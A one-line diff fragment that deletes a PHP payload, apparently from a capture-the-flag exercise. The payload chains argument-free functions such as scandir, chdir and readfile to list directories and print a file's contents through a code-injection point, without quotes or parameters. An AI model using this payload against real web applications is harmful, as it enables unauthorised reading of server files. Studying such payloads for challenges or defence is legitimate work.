@@ -1,1 +1,0 @@
-echo "echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"
